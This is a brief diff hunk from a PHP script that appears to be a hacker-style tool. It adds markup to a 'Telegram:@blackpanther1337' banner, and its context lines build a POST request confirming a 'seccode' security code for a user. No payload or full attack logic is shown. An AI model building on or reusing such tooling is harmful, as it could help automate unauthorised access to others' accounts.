@@ -201,7 +201,7 @@ if(isset($g) && $email != ""){
 echo "\n<br> ./Done>>>>>>>>";
 }
 $txt = "PHP";
-echo "Telegram:@blackpanther1337";
+echo "Telegram:@blackpanther1337<hr>";
 
 if(isset($g2) && $codeSC != ""){
     $postCode = array( 'user' => $usr , 'action' => 'seccode','debug' => '','confirm' => $codeSC);
